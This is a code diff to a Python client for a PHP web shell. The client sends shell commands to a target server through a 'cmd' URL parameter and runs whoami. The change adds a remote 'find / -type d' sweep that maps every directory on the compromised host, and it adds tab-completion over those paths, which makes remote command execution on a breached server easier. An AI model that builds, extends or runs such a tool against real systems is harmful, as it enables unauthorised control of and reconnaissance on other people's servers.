@@ -1,7 +1,7 @@
 import requests
 from colorama import init, Fore, Style  # Import colorama modules
 from prompt_toolkit import prompt
-from prompt_toolkit.completion import WordCompleter
+from prompt_toolkit.completion import Completer, Completion
 from prompt_toolkit.formatted_text import HTML  # Import HTML for styling
 from prompt_toolkit.history import InMemoryHistory  # For command history
 
@@ -21,15 +21,60 @@ def whoami():
     except requests.exceptions.RequestException as e:
         print(f"{Fore.RED}Error fetching user info: {e}")
         return "unknown"
+    
 
 # Get the user info from the target URL
 usr = whoami()
 
+if usr == "unknown":
+    print(f"{Fore.RED}Failed to retrieve user info. Check the URL.")
+    # Ask for a valid URL again
+    payloadurl = input(f"{Fore.YELLOW}Enter the URL with .php endpoint: ").strip()
+    usr = whoami()
+else:
+    print(f"{Fore.CYAN}User info retrieved: {usr}")
+
+# Function to fetch directories
+def fetch_directories():
+    try:
+        # Use 'find' to get all directories, suppress errors
+        r = requests.get(payloadurl, params={"cmd": "find / -type d 2>/dev/null"}, timeout=10)
+        r.raise_for_status()
+        dirs = r.text.strip().split('\n')
+        return dirs
+    except Exception as e:
+        print(f"{Fore.RED}Failed to fetch directories: {e}")
+        return []
+
+# Fetch directories on connect
+directories = fetch_directories()
+
 # List of commands for tab-completion
 commands = ['ls', 'pwd', 'whoami', 'cat', 'exit', 'quit', 'clear', 'help', 'sudo']
 
-# Create a completer for commands
-command_completer = WordCompleter(commands, ignore_case=True)
+class PathCompleter(Completer):
+    def __init__(self, commands, directories):
+        self.commands = commands
+        self.directories = directories
+
+    def get_completions(self, document, complete_event):
+        text = document.text_before_cursor
+        # Suggest commands if at start
+        if not text or text.split()[0] not in self.commands:
+            for cmd in self.commands:
+                if cmd.startswith(text):
+                    yield Completion(cmd, start_position=-len(text))
+        # Suggest directories for path arguments
+        else:
+            parts = text.split()
+            if len(parts) > 1:
+                arg = parts[-1]
+                for d in self.directories:
+                    if d.startswith(arg):
+                        yield Completion(d, start_position=-len(arg))
+
+# Replace WordCompleter with PathCompleter
+command_completer = PathCompleter(commands, directories)
 
 # Initialize command history
 history = InMemoryHistory()
